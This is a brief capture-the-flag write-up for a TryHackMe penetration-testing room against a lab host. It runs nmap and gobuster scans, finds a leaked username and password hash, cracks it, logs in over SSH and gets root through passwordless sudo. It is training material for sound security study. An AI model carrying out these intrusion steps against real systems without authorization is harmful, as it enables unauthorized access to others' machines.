THM CC: pen testing Room

                 Write Up
                 ========

$ sudo nmap -sCV  -v -oN nmap/initial 10.10.181.166


Task: 24 Final Exam 

Totel Open Ports

Port       Service     Version

22          ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8(Ubuntu Linux; protocol 2.0)

80            http       Apache httpd 2.4.18 ((Ubuntu))

=======================================================


Directory Scan on web server Result

Hidden Directry 

/secret
secret.txt

 

Comman extension found 

html
txt

============================================
$ gobuster dir -x html,php,phtml,txt,json,md -u http://10.10.181.166/secret -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt

# so we found secret.txt file by gobustor directory scan with extension html,php,txt etc

# secret.txt file content is following

nyan:046385855FC9580393853D8E81F240B66FE9A7B8

# this is looks like username and password hash that we use to connect with ssh

# we crack the hash from crackstaion website or we can do this with john or hashcat

# so the hash is nyan so now we have username and password 

Username = nyan
password = nyan

so we ssh to the target with 

ssh nyan@{ip address}
password = nyan

# so now have the access the target machine so we can read the user.txt 

$ cat user.txt


## Now here is the part of privellege escalation 

when we use command

$ sudo -l 

they show we can use su without password so now we get root without any problem just use command

$ sudo su

# we are root so we can see the content of the root.txt from /root/root.txt 

$ cat /root/root.txt
